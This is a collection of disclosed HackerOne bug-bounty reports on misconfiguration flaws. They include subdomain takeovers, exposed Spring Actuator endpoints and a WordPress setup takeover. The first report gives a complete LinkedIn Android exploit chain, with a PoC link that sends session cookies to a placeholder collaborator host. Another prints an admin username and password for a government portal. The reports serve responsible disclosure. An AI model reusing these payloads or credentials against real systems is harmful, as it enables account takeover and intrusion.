# Misconfiguration

_18 reports — High/Critical, disclosed_

### [Session Cookie Leakage via Static Header Field in WebViewerFragment](https://hackerone.com/reports/3475626)

- **Report ID:** `3475626`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** LinkedIn
- **Reporter:** @dphoeniixx
- **Bounty:** - usd
- **Disclosed:** 2026-03-17T06:13:57.005Z
- **CVE(s):** -

**Vulnerability Information:**

Hello LinkedIn Security Team,

I was able to identify a vulnerability in the `WebViewerFragment` that can lead to leaking the user's cookies to a threat actor. Below, I will explain the finding and provide a PoC.

## Summary

A static field (`CUSTOM_HEADERS`) in `WebViewerFragment` persists cookies across different URL loads, allowing an attacker to chain multiple weaknesses to exfiltrate a victim's LinkedIn session cookies to an attacker-controlled server.

## Root Cause

While the exploitation is complex, the root cause is simple. In the `loadUrl` method of the vulnerable fragment:

```java
public final void loadUrl(Uri uri0) {
    String s = uri0.toString();
    ...
    if(this.shouldUseCookies) {
        CookieManager cookieManager0 = CookieManager.getInstance();
        ...
        String s2 = cookieManager0.getCookie(s);
        ArrayMap arrayMap0 = WebViewerFragment.CUSTOM_HEADERS; // Static field!
        ...
        if(s2 != null) {
            arrayMap0.put("Cookie", s2);
        }
        this.webView.loadUrl(s, arrayMap0);
        return;
    }
    ...
}
```

The method retrieves cookies for the URL. If cookies exist, they are added to `WebViewerFragment.CUSTOM_HEADERS`.

### The Problem

`WebViewerFragment.CUSTOM_HEADERS` is a **static field that is never cleared** between loads. This means:

1. If the vulnerable fragment opens website A (which has cookies), those cookies are stored in `CUSTOM_HEADERS`
2. If website B is subsequently opened and has no saved cookies, the cookies from website A are still present in `CUSTOM_HEADERS` and will be sent to website B

**Attack Flow:**
1. Victim opens `https://www.linkedin.com` in the Fragment → LinkedIn cookies are saved to `CUSTOM_HEADERS`
2. Victim opens the attacker's website in the Fragment → The LinkedIn cookies already in `CUSTOM_HEADERS` are leaked to the attacker

## Exploitation Chain

There is no deep-link that directly opens the vulnerable fragment. After investigating the application, I discovered a path to reach it through chaining multiple weaknesses.

### Step 1: Weak URL Validation in Verification WebView

The Verification WebView can be opened directly via the `https://www.linkedin.com/trust/verification` deep-link. The handler extracts the URL to load from the `verificationUrl` parameter and validates the host against a whitelist:

```java
if(!z2 && SearchFrameworkPrefetchRepositoryImpl..ExternalSyntheticOutline0.m(2, "trust/verification", s)) {
    ...
    String verificationUrl = uri0.getQueryParameter("verificationUrl");
    ...
    intent8 = verificationUrlMappingImpl1.neptuneTrustVerification(verificationUrl, ...);
    ...
}
```

```java
public final Intent neptuneTrustVerification(String verificationUrl, ...) {
    if(verificationUrl == null) {
        uri1 = null;
    } else {
        uri1 = Uri.parse(s);
        if(uri1.getScheme() == null) {
            uri1 = null;
        } else {
            String host = uri1.getHost();
            if(!CollectionsKt___CollectionsKt.contains(this.supportedUrls, host) || UriUtil.isSuspectedPathTraversalUri(uri1)) {
                uri1 = null;
            }
        }
    }
    ...
}
```

**Weakness:** While the host validation is secure, the scheme is not validated. An attacker can execute JavaScript in the WebView using the `javascript:` scheme. A URL like this will pass validation:

```
javascript://www.linkedin.com/%0aalert(1)
```

However, there is a complication. A parameter is appended to the URL before loading:

```java
Uri.Builder uri$Builder1 = uri$Builder0.appendQueryParameter("renderContext", "trustVerificationDeeplink");
```

This transforms the payload into:
```
javascript://www.linkedin.com/%0aalert(1)?renderContext=trustVerificationDeeplink
```

This is invalid JavaScript and will not execute.

**Bypass:** I discovered that by opening a string and closing it after the `#` (fragment), the injected parameter becomes part of the string:

```
javascript://www.linkedin.com/%0aalert('1#')
```

With the parameter appended, this becomes:
```
javascript://www.linkedin.com/%0aalert('1?renderContext=trustVerificationDeeplink#')
```

This is valid JavaScript that executes successfully.

### Step 2: From VerificationWebView to WebViewerFragment

The Verification WebView exposes a JavaScript Interface that can open the vulnerable fragment:

```java
if(verificationWebViewFeature$createJavascriptInterface$10 != null) {
    webView0.addJavascriptInterface(verificationWebViewFeature$createJavascriptInterface$10, "Android");
}
```

```java
public final class VerificationWebViewFeature.createJavascriptInterface.1 {
    @JavascriptInterface
    public final Unit sendWebMessage(String s) {
        if(s != null) {
            JSONObject jSONObject0 = s == null ? null : new JSONObject(s);
            if(jSONObject0 != null) {
                ...
                Event event4 = new Event(jSONObject0);
                verificationWebViewFeature0._receiveWebMessageLiveData.postValue(event4);
                return Unit.INSTANCE;
            }
        }
    }
}
```

The observer for `_receiveWebMessageLiveData` processes the message:

```java
public final class VerificationWebViewFragment.createJSObserver.1 extends EventObserver {
    ...
    public final boolean onEvent(Object object0) {
        ...
        String s3 = VerificationWebViewFragment.getNonEmptyString("additionalWebViewUrl", ((JSONObject)object0));
        if(s3 != null) {
            WebViewerBundle webViewerBundle0 = WebViewerBundle.create(s3, null, null);
            verificationWebViewFragment0.webRouterUtil.launchWebViewer(webViewerBundle0);
        }
        ...
    }
}
```

Calling `Android.sendWebMessage(JSON.stringify({additionalWebViewUrl: "https://www.linkedin.com"}))` triggers `launchWebViewer` to open the URL.

### Step 3: Forcing the Web Viewer Client

The `launchWebViewer` method uses interceptors to determine which client to use (Browser, Web Viewer, Custom Tabs). To ensure the vulnerable `WebViewerFragment` is used, we need to satisfy an interceptor that sets the client to `web_viewer`:

```java
public class LinkedInUrlRequestInterceptor implements RequestInterceptor {
    @Override
    public final Request intercept(CurrentActivityGetter currentActivityGetter0, Request request0) {
        Activity activity0 = currentActivityGetter0.get();
        if(!WebViewerUtils.isLinkedInUrl(request0.url.toString()) && !WebViewerUtils.isLinkedInArticleUrl(request0.url.toString())) {
            if(activity0 != null && !this.sharedPreferences.sharedPreferences.getBoolean("openWebUrlsInApp", true)) {
                request0.suggestedWebClientName = "browser";
            }
            return request0;
        }
        request0.suggestedWebClientName = "web_viewer";
        return request0;
    }
    ...
}
```

The `isLinkedInArticleUrl` method uses a regex:

```java
public class WebViewerUtils {
    static {
        WebViewerUtils.FIRST_PARTY_ARTICLE_PATTERN = Pattern.compile("(http|https)://www.linkedin(-ei)?.com/pulse/+");
    }
    public static boolean isLinkedInArticleUrl(String s) {
        if(!WebViewerUtils.PULSE_CHANNEL_PATTERN.matcher(s).find() && ...) {
            if(WebViewerUtils.FIRST_PARTY_ARTICLE_PATTERN.matcher(s).find()) {
                ...
                return true;
            }
        }
        ...
    }
}
```

**Weakness:** The regex does not use `^` anchor, so it matches anywhere in the URL. By appending `http://www.linkedin.com/pulse/1` to our URL, we can pass this check and force the vulnerable fragment to open.

## Complete Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│ 1. Victim clicks malicious link                                         │
│    └─→ Opens trust/verification deep-link with javascript: payload      │
├─────────────────────────────────────────────────────────────────────────┤
│ 2. JavaScript executes in VerificationWebView                           │
│    └─→ Bypasses host validation via javascript://www.linkedin.com/      │
│    └─→ Fragment trick (#) neutralizes injected query parameter          │
├─────────────────────────────────────────────────────────────────────────┤
│ 3. JavaScript calls Android.sendWebMessage()                            │
│    └─→ First call: Opens https://www.linkedin.com/...                   │
│    └─→ LinkedIn cookies stored in static CUSTOM_HEADERS                 │
├─────────────────────────────────────────────────────────────────────────┤
│ 4. After delay, second sendWebMessage() call                            │
│    └─→ Opens attacker's server URL                                      │
│    └─→ LinkedIn cookies in CUSTOM_HEADERS sent to attacker              │
├─────────────────────────────────────────────────────────────────────────┤
│ 5. Attacker receives victim's LinkedIn session cookies                  │
│    └─→ Complete account takeover possible                               │
└─────────────────────────────────────────────────────────────────────────┘
```

## Proof of Concept

### Steps to Reproduce

1. Host the following HTML on your server, replacing `{COLLABORATOR_HOST}` with your domain:
```html
<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Cookie Leak PoC</title>
</head>
<body>
    <a href="https://www.linkedin.com/trust/verification?verificationUrl=javascript://www.linkedin.com/%250asetTimeout%28%28%29%3D%3E%7BAndroid.sendWebMessage%28%27%7B%22additionalWebViewUrl%22%3A%22https%3A%2F%5Cu002f{COLLABORATOR_HOST}%2Fhttp%3A%2F%5Cu002fwww.linkedin.com%2Fpulse%2F1%22%7D%27%29%7D%2C%201000%29%3BAndroid.sendWebMessage%28%27%7B%22additionalWebViewUrl%22%3A%22https%3A%2F%5Cu002fwww.linkedin.com%2Fhttp%3A%2F%5Cu002fwww.linkedin.com%2Fpulse%2F1%23%22%7D%27%29%3B">Click Here</a>
</body>
</html>
```
2. On an Android device with LinkedIn installed, open the HTML page in a mobile browser
3. Tap "Click Here"
4. You will see Linkedin is Opened on WebView.
5. Once you go back or close the WebView, another WebView will launch redirecting to your collaborator server, leaking the cookies.
6. Observe the leaked LinkedIn cookies in your server logs (Cookie header will contain LinkedIn session tokens)

## Impact

- **Complete session takeover** via stolen authentication cookies
- Attacker gains **full access to victim's LinkedIn account**

**Summary (researcher):**

write-up: https://dphoeniixx.medium.com/normal-usage-of-linkedin-leaks-your-secrets-74aa968850fd

---

### [Internal Access to Hackerone confluence Docs](https://hackerone.com/reports/3113398)

- **Report ID:** `3113398`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** HackerOne
- **Reporter:** @madara_
- **Bounty:** 12500 usd
- **Disclosed:** 2025-08-15T15:30:51.456Z
- **CVE(s):** -

**Summary (team):**

This vulnerability allowed external access to HackerOne's internal Confluence documentation through a support system misconfiguration. The impact included:

- Access to internal documentation that wasn't intended for public viewing
- The ability to view and modify limited content within the Confluence instance

This configuration issue demonstrated how support system workflows could be leveraged to gain unauthorized access to internal resources.

---

### [subdomain takeover at █████████](https://hackerone.com/reports/2106886)

- **Report ID:** `2106886`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Mars
- **Reporter:** @skoll101
- **Bounty:** - usd
- **Disclosed:** 2023-11-15T18:39:53.217Z
- **CVE(s):** -

**Summary (team):**

Summary:
I discovered a subdomain takeover vulnerability at ██████████. The subdomain was pointing to an inactive or non-existent resource, allowing an attacker to claim the resource and take control of the subdomain.

Details:
While performing reconnaissance on █████, I noticed that the ███████ subdomain was pointing to a resource on a third-party service. However, upon further investigation, I found that the resource was either inactive or non-existent.
This allowed me to claim the resource on the third-party service and take control of the ██████████ subdomain. As a result, I was able to serve arbitrary content on the subdomain
Steps To Reproduce:
I wanted to share with you that I have successfully claimed the domain at the following URL: ██████████. Please feel free to visit the website to see the changes I have made. You can also see a screenshot of the website below.

Impact:
A successful subdomain takeover can have severe consequences for the security of ██████ and its users. An attacker could utilise the takeover to serve malicious content, steal sensitive information, or launch further attacks against ████████ or its users.
Thank you for your time and consideration.
Best regards,

---

### [Wordpress Takeover using setup configuration at http://████.edu [HtUS]](https://hackerone.com/reports/1626205)

- **Report ID:** `1626205`
- **Severity:** Critical
- **Weakness:** Misconfiguration
- **Program:** U.S. Dept Of Defense
- **Reporter:** @berserkbd47
- **Bounty:** 1000 usd
- **Disclosed:** 2023-01-13T18:04:31.536Z
- **CVE(s):** -

**Vulnerability Information:**

Description:

The WordPress 'setup-config.php' installation page allows users to install
WordPress in local or remote MySQL databases. This typically requires a user
to have valid MySQL credentials to complete.  However, a malicious user can
host their own MySQL database server and can successfully complete the
WordPress installation without having valid credentials on the target system.


Reproduce step by step:

I found this vulnerable url:
http://███.edu/old/wp-admin/setup-config.php

Then i configured db 
I used this site https://www.freemysqlhosting.net/

After configure I got wordpress admin access

proof:
http://██████████.edu/old/rce.txt


Admin credentials that I set after installing the config
username: ████████
password: ███

Login Panel: http://████████.edu/old/wp-login.php

Video POC has been attached as well.

## Impact

Impact
Remote Code Execution/Total system compromise.
Attacker can upload webshell into the server. I did not upload any shell for security violation.

Malware distribution
Phishing / Spear phishing
XSS
Authentication bypass

---

### [Mass account takeover!](https://hackerone.com/reports/1634165)

- **Report ID:** `1634165`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Stripe
- **Reporter:** @akashhamal0x01
- **Bounty:** - usd
- **Disclosed:** 2022-12-21T22:08:07.375Z
- **CVE(s):** -

**Summary (team):**

@akashhamal0x01 discovered an Organization Owner could update the email address of a member of their organization in TaxJar. This could have allowed an attacker to take over a victim’s account if the victim belonged to the attacker’s organization. The vulnerability was caused by the ability to edit another member’s email address and was resolved by restricting Organization Owners from editing a member’s email address.

**Summary (researcher):**

A misconfiguration was found by which other users mail can be changed resulting in account takeover!

---

### [Subdomain takeover on 'de-headless.staging.gymshark.com'](https://hackerone.com/reports/1711890)

- **Report ID:** `1711890`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Gymshark
- **Reporter:** @a-p0c
- **Bounty:** - usd
- **Disclosed:** 2022-10-27T11:14:05.926Z
- **CVE(s):** -

**Vulnerability Information:**

The Gymshark subdomain https://de-headless.staging.gymshark.com/ was pointing to an unclaimed Shopify site. Because of this an attacker could claim this subdomain, via Shopify, and serve their own content.

This is extremely dangerous as an attacker could serve any malicious content on this domain such as malware, domain defacement, phishing campaigns etc. 

Also, phishing victims wouldn't be able to identify the maliciousness of a potential phishing campaign because it would be from a valid Gymshark subdomain.

**Note:** *I have temporarily claimed this domain for PoC and have password protected the site to reduce unnecessary impact to others. I am happy to remove this protection if you require further takeover evidence*.

## Remediation
- Remove the CNAME record for Shopify on 'de-headless.staging.gymshark.com'.
- I can release 'de-headless.staging.gymshark.com' for reclaim if needed.

## PoC Link
https://de-headless.staging.gymshark.com/

## PoC Evidence
{F1954064}
{F1954066}
{F1954069}
{F1954070}

Thanks, A-p0c

## Impact

If an attacker controlled https://de-headless.staging.gymshark.com/ they could host any malicious content they wanted, such as malware, defacement, a convincing phishing campaign

---

### [Security misconfiguration ](https://hackerone.com/reports/1486327)

- **Report ID:** `1486327`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** lemlist
- **Reporter:** @mr23r0
- **Bounty:** - usd
- **Disclosed:** 2022-05-16T09:41:20.201Z
- **CVE(s):** -

**Vulnerability Information:**

## Description :
When we request a magic link to login into the application, and use that same link in multiple browsers, it working there isn't any limit on use of link.

Steps to reproduce :
1. go to app.lemilist.com
2. create a magic link 
3. use it to login 
4. now open another browser or incognito window
5. use that same magic link

And You'll be logged in in your account.

## Impact

If Attacker gets the magic link of user he can login into victim's account.
Account takeover.

Mitigation :
1. Add a limit to magic link and remove the magic link from database after 1 use.
2. only allow the Requester IP to login using the magic link.

---

### [Subdomain Takeover on proxies.sifchain.finance pointing to vercel](https://hackerone.com/reports/1487793)

- **Report ID:** `1487793`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Sifchain
- **Reporter:** @hrdfrdh
- **Bounty:** - usd
- **Disclosed:** 2022-04-01T15:25:49.253Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team,

Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a page on the service that was being used and point their page to that subdomain. For example, if subdomain.example.com was pointing to a GitHub page and the user decided to delete their GitHub page, an attacker can now create a GitHub page, add a CNAME file containing subdomain.example.com, and claim subdomain.example.com.
Here there is a Sifchain domain  (proxies.sifchain.finance) which is pointing towards vercel pages so  this domain can be taken over can can be used to do any type of attacks mostly i can make a fake login page on your behalf and spoof your users, this is a critical vulnerability and needs to be fixed .

{F1627827}

Vulnerable url : https://proxies.sifchain.finance/

{F1627821}

Cname: cname.vercel-dns.com
Name: proxies.sifchain.finance
Type: CNAME
Class: IN

## Steps To Reproduce/Concept:

1. Visit https://vercel.com/login and login with dev sifchain account

2. Check the availability of the proxies.sifchain.finance sub domain at https://vercel.com/[YourUsername]/sveltekit/settings/domains

3. The proxies.sifchain.finance sub domain does not exist. Potential to be claimed by others

## Remediation:
Remove the cname entry or claim the subdomain proxies.sifchain.finance on vercel.com

## References:
https://github.com/EdOverflow/can-i-take-over-xyz/issues/183

{F1627822}
{F1627826}

https://github.com/EdOverflow/can-i-take-over-xyz
https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/
https://0xpatrik.com/subdomain-takeover/
http://yassineaboukir.com/blog/neglected-dns-records-exploited-to-takeover-subdomains/

Best Regards,
@hrdfrdh

## Impact

Fake website
Malicious code injection
Users tricking
Company impersonation
This issue can have really huge impact on the companies reputation someone could post malicious content on the compromised site and then your users will think it's official but it's not

---

### [Password reset token leakage](https://hackerone.com/reports/1354437)

- **Report ID:** `1354437`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** UPchieve
- **Reporter:** @theendisnear
- **Bounty:** - usd
- **Disclosed:** 2022-03-26T17:59:52.390Z
- **CVE(s):** -

**Vulnerability Information:**

Reset Password link : http://hackers.upchieve.org/setpassword?token=a3c448b1eb9b982f93ec39a7181ec1a2

1.Open Password reset page from email.
2.Intercept the request(I have used burp suite)
3.You can see the link for reset password in below requests

POST /j/collect?v=1&_v=j93&a=1038273919&t=pageview&_s=1&dl=https%3A%2F%2Fhackers.upchieve.org%2Fsetpassword%3Ftoken%3Da3c448b1eb9b982f93ec39a7181ec1a2&dp=%2Fsetpassword&ul=en-us&de=UTF-8&dt=UPchieve&sd=24-bit&sr=1366x768&vp=1366x657&je=0&_u=wCCAAUABAAAAAC~&jid=185704536&gjid=1537782490&cid=83313712.1632910097&tid=UA-133171872-1&_gid=1095396647.1632910097&_r=1&gtm=2ou9r0&z=1390812166 HTTP/2
Host: www.google-analytics.com
Content-Length: 0
Sec-Ch-Ua: "Chromium";v="93", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: text/plain
Accept: */*
Origin: https://hackers.upchieve.org
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

POC video : recording-1632911031270.webm

@thug645

## Impact

Misconfiguration

---

### [Мисконфигурация Cisco Smart Install](https://hackerone.com/reports/1398662)

- **Report ID:** `1398662`
- **Severity:** Critical
- **Weakness:** Misconfiguration
- **Program:** Azbuka Vkusa
- **Reporter:** @kerbyj
- **Bounty:** - usd
- **Disclosed:** 2021-11-16T12:24:32.960Z
- **CVE(s):** -

**Summary (team):**

Closed.

---

### [Weak password policy leading to exposure of administrator account access](https://hackerone.com/reports/1168104)

- **Report ID:** `1168104`
- **Severity:** Critical
- **Weakness:** Misconfiguration
- **Program:** U.S. General Services Administration
- **Reporter:** @rptl
- **Bounty:** - usd
- **Disclosed:** 2021-05-20T14:45:10.915Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

The login endpoint https://mysmartplans.gsa.gov/Marathon/Default.aspx is having weak password policy.

During the recon, I came across a mysmartplans overview document http://www.accentimaging.com/accent/pdfs/Accent%20MySmartPlans.pdf
. In this document few users are mentioned like - rick, ban, tim etc.I tried to login user password combination of these user-names & rick wass found a valid administrator username & password.

username- rick
password -rick

This user appears to be administrator user.
Hope GSA takes necessary measures to improve user account policies.

PoC

1) Open url https://mysmartplans.gsa.gov/Marathon/Default.aspx
2) Enter username  rick password rick
3) You will be logged into user account with administrative access. You can edit, create, update users.

## Impact

Admin account compromise.

---

### [Ability To Delete User(s) Account Without User Interaction](https://hackerone.com/reports/928255)

- **Report ID:** `928255`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** GitLab
- **Reporter:** @hx01
- **Bounty:** - usd
- **Disclosed:** 2021-03-17T20:11:03.367Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary:
Gitlab allows its user to exercise their GDPR rights (Right to Access/Delete) user data by sending an email to gdpr-request@gitlab.com however gitlab team doesn't ask for security question(i.e Date Of Birth) before deleting the user account moreover doesn't authenticate the incoming emails from their  instance which allows an attacker to delete user accounts without user interaction :
██████

### Steps to reproduce
1. Send an spoofed email from victim's email address to gdpr-request@gitlab.com from a reputable SMTP (e.g: Sendgrid):
███████
2. Victim will receive the following  confirmation email:

{F914565}
3. In the next few days victim's account will be deleted :

██████

### Fix :
* Add second verification i.e ask for DOB,Government ID.

## Impact

Since Gitlab doesn't verify the request with an Valid ID before triggering Right to Access/Deletion this breaches the GDPR Law(Article 15) & moreover allows an attacker to delete User Accounts without user interaction.

**Summary (researcher):**

Research Paper: https://hx01.me/Abusing_Data_Protection_Laws_For_D0xing_and_Account_Takeovers.pdf

---

### [Route53 Subdomain Takeover on test-cncf-aws.canary.k8s.io](https://hackerone.com/reports/794382)

- **Report ID:** `794382`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Kubernetes
- **Reporter:** @rhynorater
- **Bounty:** - usd
- **Disclosed:** 2021-01-16T06:07:13.398Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I discovered that it was possible to takeover ` test-cncf-aws.canary.k8s.io` by assigning a zone to that name with one of the following nameservers in Route53:
```
test-cncf-aws.canary.k8s.io. 3600 IN    NS      ns-265.awsdns-33.com.
test-cncf-aws.canary.k8s.io. 3600 IN    NS      ns-687.awsdns-21.net.
test-cncf-aws.canary.k8s.io. 3600 IN    NS      ns-1458.awsdns-54.org.
test-cncf-aws.canary.k8s.io. 3600 IN    NS      ns-1825.awsdns-36.co.uk.
```
Once the zone was claimed, I was able to create DNS records under this host. Consider the following record:
```
poc.test-cncf-aws.canary.k8s.io
```

##Steps To Reproduce:
1. See above domain

##Remediation Instructions
Remove the NS record delegation NS privs on a subdomain before you delete the zone

## Impact

With this vulnerability, an attacker can host arbitrary content under your domain. This can allow an attacker to host brand-damaging materials, steal sensitive * scoped session cookies, and even escalate other vulnerabilities.

---

### [Subdomain Takeover due to unclaimed domain pointing to Acquia Cloud](https://hackerone.com/reports/874482)

- **Report ID:** `874482`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Insulet Corporation
- **Reporter:** @kumarp16
- **Bounty:** - usd
- **Disclosed:** 2021-01-14T14:00:28.738Z
- **CVE(s):** -

**Vulnerability Information:**

ssue Details

The consultant identified that subdomain http:// or https://qa.myomnipod.com 

Web Site Not Found

Sorry, we could not find any content for this web address. Please check the URL.

If you are an Acquia Cloud customer and expect to see your site at this address, you'll need to add this domain name to your site via the Acquia Network management console.

Error Is displayed.

How did you come across this bug ?

Using enumeration, I was able to discover this domain and determined it

NOTE: The hostname was not claimed by me also because i need to pay certain amount to host a website.

## Impact

Sub-domain take over attacks can happen when a company creates a dns entry that points to a third party service, however forgets about the third party application leaving it vulnerable to be hijacked by another party. Hackers can claim subdomains with the help of external services. This attack is practically non-traceable.

---

### [Django DEBUG mode enabled and leaked system information.](https://hackerone.com/reports/963542)

- **Report ID:** `963542`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** Dropcontact
- **Reporter:** @aungkyawphyo
- **Bounty:** - usd
- **Disclosed:** 2020-08-21T08:12:50.074Z
- **CVE(s):** -

**Summary (team):**

We were leaking / showing system information.

**Summary (researcher):**

Django DEBUG mode was enabled and showing some information on some errors.I just follow the errors and finally got some sensitive system information such as configuation ,API keys ,Database users ,System Directories,etc..

---

### [Spring Actuator endpoints publicly available and broken authentication](https://hackerone.com/reports/838635)

- **Report ID:** `838635`
- **Severity:** Critical
- **Weakness:** Misconfiguration
- **Program:** LY Corporation
- **Reporter:** @kazan71p
- **Bounty:** 12500 usd
- **Disclosed:** 2020-08-06T05:13:26.680Z
- **CVE(s):** -

**Summary (team):**

Due to insufficient access control, it was possible to access the Spring Boot Actuator endpoints /heapdump and /env. @kazan71p identified two highly sensitive applications leaking information through these endpoints.

The LINE Security team shutdown the secondary endpoints just as it was discovered by the reporter, as part of our incident response process. After further investigation, we also found that both applications had the same issue with their authentication functionality, due to using the same library. The issue was that old tokens were not expiring and being properly invalidated, allowing for replay attacks that should not have been possible.

The applications were highly sensitive in nature, but due to not being able to retrieve specific data, we decided to award a bounty slightly below the maximum reward for this type of issue. We want to thank @kazan71p  for his cooperation and contribution to our program!

---

### [Spring Actuator endpoints publicly available, leading to account takeover](https://hackerone.com/reports/862589)

- **Report ID:** `862589`
- **Severity:** Critical
- **Weakness:** Misconfiguration
- **Program:** LY Corporation
- **Reporter:** @kazan71p
- **Bounty:** 5000 usd
- **Disclosed:** 2020-08-04T02:52:31.171Z
- **CVE(s):** -

**Summary (team):**

Due to insufficient access controls, it was possible to access the Spring Boot Actuator endpoints /heapdump and /env. The /heapdump endpoint leaks data from the Java Virtual Machine, leading to disclosure of admin credentials, user tokens and a combination of other data.

This endpoint was not discovered by the internal security team due to being put on a custom path, avoiding detection through our usual means. The reporter accessing this endpoint also triggered a warning for our CSIRT team, allowing us to take quick and coordinated action. After quickly restricting access to this endpoint, we investigated and found no activity except that of the reporter.

The maximum impact of this issue was potential takeover of random LINE Official Accounts through leaked tokens/cookies. We appreciate the professionalism and clear communication from @kazan71p and want to thank him for helping keep LINE secure.

---

### [misconfigured CORS let to HPP and SOP bypass](https://hackerone.com/reports/867436)

- **Report ID:** `867436`
- **Severity:** High
- **Weakness:** Misconfiguration
- **Program:** BTFS
- **Reporter:** @dagamosst90
- **Bounty:** - usd
- **Disclosed:** 2020-05-07T21:57:21.720Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team,
I found a bug on your website that let me bypass the SOP policy.
Hope you fix it, everything is in the video


https://www.youtube.com/watch?v=PYsU350S-s4

## Impact

The attacker my direct a victim to a phishing page of www.bitterrent.com/login and he/she will be convince to enter their email and password or even hijack csrf-token and sending him a password or email reset link.
I also found a link that expose the csrf-token on the URL and you should check this link in the black.svg host header URL

---
